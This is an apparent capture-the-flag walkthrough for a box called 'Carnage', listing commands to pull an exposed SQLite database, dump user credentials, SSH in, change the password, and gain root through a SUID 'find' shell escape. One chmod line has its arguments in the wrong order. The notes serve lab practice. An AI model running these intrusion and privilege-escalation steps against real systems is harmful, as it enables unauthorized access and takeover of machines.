Carnage

## Popping a shell:
- `http://ip:81/web.db`
- `sqlite3`
	- `.open web.db`
	- `.headers on`
	- `.tables` --> `users`
	- `SELECT * FROM USERS;` --> username, password, + flag (base64 decode)

- Use ```bobba:[RADACTED]``` to ssh into box (password is always the same)
- `passwd bobba` to change password

## Getting root:

- SUID find: linpeans/linenum/`find / -perm -4000` --> https://gtfobins.github.io/
	- `/usr/bin/find . -exec /bin/bash \; -quit`
	- `chmod /usr/bin/find 0755`
	- `echo "$USERNAME" >> king.txt`

